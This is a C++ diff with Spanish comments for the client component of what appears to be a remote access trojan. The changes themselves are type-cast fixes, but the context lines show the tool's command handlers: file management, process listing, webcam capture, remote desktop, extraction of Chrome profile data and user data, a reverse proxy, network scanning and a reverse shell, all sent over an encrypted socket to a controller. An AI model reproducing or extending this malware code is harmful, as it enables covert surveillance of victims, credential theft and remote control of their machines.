@@ -182,7 +182,7 @@ bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
 			continue;
 		}
 
-		if (this->mod_dynamic->WS32.pConnect(this->sckSocket, sP->ai_addr, sP->ai_addrlen) == -1) {
+		if (this->mod_dynamic->WS32.pConnect(this->sckSocket, sP->ai_addr, static_cast<int>(sP->ai_addrlen)) == -1) {
 			//No se pudo conectar
             __DBG_("[X] No se pudo conectar");
 			continue;
@@ -247,7 +247,7 @@ void Cliente::Process_Queue() {
 //Procesar comando completo
 void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     std::vector<std::string> strIn;
-    int iRecibido = paquete.cBuffer.size(); // esto -1 con datos binarios
+    size_t iRecibido = paquete.cBuffer.size(); // esto -1 con datos binarios
     int iComando = paquete.uiTipoPaquete;
 
     //#####################################################
@@ -257,8 +257,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
         //strIn[0] = id archivo
         if (strIn.size() == 1) {
-            int iHeadsize = strIn[0].size() + 1;
-            int iBytesSize = iRecibido - iHeadsize - 1; // -1 por el \0 agregado al armar el paquete
+            size_t iHeadsize = strIn[0].size() + 1;
+            size_t iBytesSize = iRecibido - iHeadsize - 1; // -1 por el \0 agregado al armar el paquete
             const char* cBytes = paquete.cBuffer.data() + iHeadsize;
             //__DBG_("Ejcribiendoj");
             if (this->map_Archivos_Descarga[strIn[0]].ssOutfile.get()->is_open()) {
@@ -344,7 +344,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Listar drives
     if (iComando == EnumComandos::FM_Discos) {
         std::string strDipositivos = strDrivesData();
-        this->cChunkSend(this->sckSocket, strDipositivos.c_str(), strDipositivos.size(), 0, true, nullptr, EnumComandos::FM_Discos_Lista);
+        this->cChunkSend(this->sckSocket, strDipositivos.c_str(), static_cast<int>(strDipositivos.size()), 0, true, nullptr, EnumComandos::FM_Discos_Lista);
         return;
     }
 
@@ -356,13 +356,13 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         if (strIn_c == "DESCAR-DOWN") {
             strPath = this->ObtenerDown();
             std::string strPathBCDown = strPath;
-            this->cChunkSend(this->sckSocket, strPathBCDown.c_str(), strPathBCDown.size(), 0, true, nullptr, EnumComandos::FM_CPATH);
+            this->cChunkSend(this->sckSocket, strPathBCDown.c_str(), static_cast<int>(strPathBCDown.size()), 0, true, nullptr, EnumComandos::FM_CPATH);
             std::this_thread::sleep_for(std::chrono::milliseconds(10));
         }
         else if (strIn_c == "ESCRI-DESK") {
             strPath = this->ObtenerDesk();
             std::string strPathBCDesk = strPath;
-            this->cChunkSend(this->sckSocket, strPathBCDesk.c_str(), strPathBCDesk.size(), 0, true, nullptr, EnumComandos::FM_CPATH);
+            this->cChunkSend(this->sckSocket, strPathBCDesk.c_str(), static_cast<int>(strPathBCDesk.size()), 0, true, nullptr, EnumComandos::FM_CPATH);
             std::this_thread::sleep_for(std::chrono::milliseconds(10));
         }
         else {
@@ -378,7 +378,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
 
         strCommand.pop_back();
 
-        this->cChunkSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true, nullptr, EnumComandos::FM_Dir_Folder);
+        this->cChunkSend(this->sckSocket, strCommand.c_str(), static_cast<int>(strCommand.size()), 0, true, nullptr, EnumComandos::FM_Dir_Folder);
 
         return;
     }
@@ -446,7 +446,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     if (iComando == EnumComandos::FM_Editar_Archivo_Guardar_Remoto) {
         strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
         if (strIn.size() == 1) {
-            int iHeader = strIn[0].size() + 1;
+            size_t iHeader = strIn[0].size() + 1;
             EditarArchivo_Guardar(strIn[0], paquete.cBuffer.data() + iHeader, static_cast<std::streamsize>(iRecibido - iHeader - 1));
         }
         return;
@@ -483,7 +483,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
 
     if (iComando == EnumComandos::PM_Refrescar) {
         std::string strProc = strProcessList();
-        this->cChunkSend(this->sckSocket, strProc.c_str(), strProc.size(), 0, true, nullptr, EnumComandos::PM_Lista);
+        this->cChunkSend(this->sckSocket, strProc.c_str(), static_cast<int>(strProc.size()), 0, true, nullptr, EnumComandos::PM_Lista);
         return;
     }
 
@@ -557,7 +557,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             strPaquete += "Nica|Nica2 :v";
         }
 
-        this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::CM_Lista_Salida);
+        this->cChunkSend(this->sckSocket, strPaquete.c_str(), static_cast<int>(strPaquete.size()), 0, true, nullptr, EnumComandos::CM_Lista_Salida);
 
         return;
     }
@@ -609,13 +609,13 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             std::string strHeader = paquete.cBuffer.data();
             strHeader.append(1, CMD_DEL);
 
-            int iHeaderSize = strHeader.size();
-            u_int uiPacketSize = 0;
+            size_t iHeaderSize = strHeader.size();
+            size_t uiPacketSize = 0;
             std::vector<BYTE> cBuffer = this->mod_Cam->GetFrame(iDeviceIndex);
 
             if (cBuffer.size() > 0) {
-                std::vector<BYTE> cJPGBuffer = this->mod_Cam->toJPEG(cBuffer.data(), cBuffer.size());
-                u_int iJPGBufferSize = cJPGBuffer.size();
+                std::vector<BYTE> cJPGBuffer = this->mod_Cam->toJPEG(cBuffer.data(), static_cast<u_int>(cBuffer.size()));
+                size_t iJPGBufferSize = cJPGBuffer.size();
                 if (iJPGBufferSize > 0) {
                     uiPacketSize = iHeaderSize + iJPGBufferSize;
                     std::vector<BYTE> cPacket(uiPacketSize);
@@ -623,7 +623,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                         m_memcpy(cPacket.data(), strHeader.c_str(), iHeaderSize);
                         m_memcpy(cPacket.data() + iHeaderSize, cJPGBuffer.data(), iJPGBufferSize);
 
-                        int iSent = this->cChunkSend(this->sckSocket, reinterpret_cast<const char*>(cPacket.data()), uiPacketSize, 0, true, nullptr, EnumComandos::CM_Single_Salida);
+                        int iSent = this->cChunkSend(this->sckSocket, reinterpret_cast<const char*>(cPacket.data()), static_cast<int>(uiPacketSize), 0, true, nullptr, EnumComandos::CM_Single_Salida);
                         _DBG_("[!] bytes sent", iSent);
 
                     }
@@ -770,7 +770,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                 //std::cout << "Bounds: xStart:" << m.rectData.xStart << " yStart: " << m.rectData.yStart << "\n";
             }
             strPaquete.pop_back();
-            this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::RD_Lista_Salida);
+            this->cChunkSend(this->sckSocket, strPaquete.c_str(), static_cast<int>(strPaquete.size()), 0, true, nullptr, EnumComandos::RD_Lista_Salida);
         }
         else {
             _DBG_("No se obtuvieron monitores ? ", this->mod_dynamic->KERNEL32.pGetLastError());
@@ -933,7 +933,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         if (strPaquete.size() > 0) {
             strPaquete = strPaquete.substr(0, strPaquete.size() - 6);
-            this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::WM_Lista);
+            this->cChunkSend(this->sckSocket, strPaquete.c_str(), static_cast<int>(strPaquete.size()), 0, true, nullptr, EnumComandos::WM_Lista);
         }
         return;
     }
@@ -993,7 +993,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             strPaquete.pop_back();
         }
 
-        this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::INF_Chrome_Profiles_Out);
+        this->cChunkSend(this->sckSocket, strPaquete.c_str(), static_cast<int>(strPaquete.size()), 0, true, nullptr, EnumComandos::INF_Chrome_Profiles_Out);
 
         return;
     }
@@ -1012,7 +1012,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             _DBG_(strIn[0], strIn[1]);
             std::string strPaquete = this->mod_Inf0->m_GetProfileData(strIn[0], strIn[1][0]);
             if (strPaquete.size() > 2) {
-                this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::INF_Chrome_Profile_Data_Out);
+                this->cChunkSend(this->sckSocket, strPaquete.c_str(), static_cast<int>(strPaquete.size()), 0, true, nullptr, EnumComandos::INF_Chrome_Profile_Data_Out);
             }
             else {
                 this->cChunkSend(this->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, nullptr, EnumComandos::INF_Error);
@@ -1033,7 +1033,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         std::string strPaquete = this->mod_Inf0->m_GetUsersData();
         if (strPaquete.size() > 6) {
-            this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::INF_Users);
+            this->cChunkSend(this->sckSocket, strPaquete.c_str(), static_cast<int>(strPaquete.size()), 0, true, nullptr, EnumComandos::INF_Users);
         }
         else {
             this->cChunkSend(this->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, nullptr, EnumComandos::INF_Error);
@@ -1050,7 +1050,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             this->mod_ReverseProxy = new ReverseProxy(this->mod_dynamic->WS32);
         }
         std::vector<char> buffer(paquete.cBuffer);
-        this->mod_ReverseProxy->m_ProcesarDatosProxy(buffer, iRecibido - 1);
+        this->mod_ReverseProxy->m_ProcesarDatosProxy(buffer, static_cast<int>(iRecibido - 1));
         return;
     }
 
@@ -1073,7 +1073,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         strPaquete = strPaquete.substr(0, strPaquete.size() - 4);
 
-        this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, false, nullptr, EnumComandos::Net_Scan);
+        this->cChunkSend(this->sckSocket, strPaquete.c_str(), static_cast<int>(strPaquete.size()), 0, false, nullptr, EnumComandos::Net_Scan);
         return;
     }
 
@@ -1101,7 +1101,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             }
             strPaquete = strPaquete.substr(0, strPaquete.size() - 4);
 
-            this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, false, nullptr, iComando);
+            this->cChunkSend(this->sckSocket, strPaquete.c_str(), static_cast<int>(strPaquete.size()), 0, false, nullptr, iComando);
         }
         return;
     }
@@ -1278,7 +1278,7 @@ void Cliente::iniPacket() {
 
     _DBG_(strOut, 0);
     
-    int iEnviado = this->cChunkSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, true, nullptr, EnumComandos::INIT_PACKET);
+    int iEnviado = this->cChunkSend(this->sckSocket, strOut.c_str(), static_cast<int>(strOut.size()), 0, true, nullptr, EnumComandos::INIT_PACKET);
     
     _DBG_("[INIT]Enviados ", iEnviado);
 }
@@ -1385,7 +1385,7 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     std::unique_lock<std::mutex> lock(this->sck_mutex);
 
     //Tamaño del buffer
-    int iDataSize = pLen;
+    size_t iDataSize = static_cast<size_t>(pLen);
 
     ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(pBuffer), iDataSize);
     iDataSize = cData.size();
@@ -1420,7 +1420,7 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
         }
     }
     
-    iEnviado = send_all(pSocket, cBufferFinal.data(), iDataSize, pFlags);
+    iEnviado = send_all(pSocket, cBufferFinal.data(), static_cast<int>(iDataSize), pFlags);
     if (err_code != nullptr) {
         if (this->mod_dynamic->KERNEL32.pGetLastError) {
             *err_code = this->mod_dynamic->KERNEL32.pGetLastError();
@@ -1537,7 +1537,7 @@ int Cliente::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool
     
     //Decrypt data
     ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cRecvBuffer.data()), iRecibido);
-    iRecibido = bOut.size();
+    iRecibido = static_cast<int>(bOut.size());
     if (iRecibido == 0) {
         if (this->mod_dynamic->KERNEL32.pGetLastError) {
             _DBG_("[cRecv] No se pudo desencriptar el buffer", this->mod_dynamic->KERNEL32.pGetLastError());
@@ -1622,7 +1622,7 @@ ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
 
 //Log Remoto
 void Cliente::m_RemoteLog(const std::string _strMsg) {
-    this->cChunkSend(this->sckSocket, _strMsg.c_str(), _strMsg.size(), 0, false, nullptr, EnumComandos::LOG);
+    this->cChunkSend(this->sckSocket, _strMsg.c_str(), static_cast<int>(_strMsg.size()), 0, false, nullptr, EnumComandos::LOG);
 }
 
 //Misc
@@ -1823,7 +1823,7 @@ void ReverseShell::thEscribirShell(std::string pStrInput) {
     DWORD dBytesWrited = 0;
     //stdinWr tuberia de entrada
     if (cCliente->mod_dynamic->KERNEL32.pWriteFile) {
-        if (!cCliente->mod_dynamic->KERNEL32.pWriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
+        if (!cCliente->mod_dynamic->KERNEL32.pWriteFile(this->stdinWr, pStrInput.c_str(), static_cast<int>(pStrInput.size()), &dBytesWrited, nullptr)) {
             DWORD err = 0;
             if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
                 err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
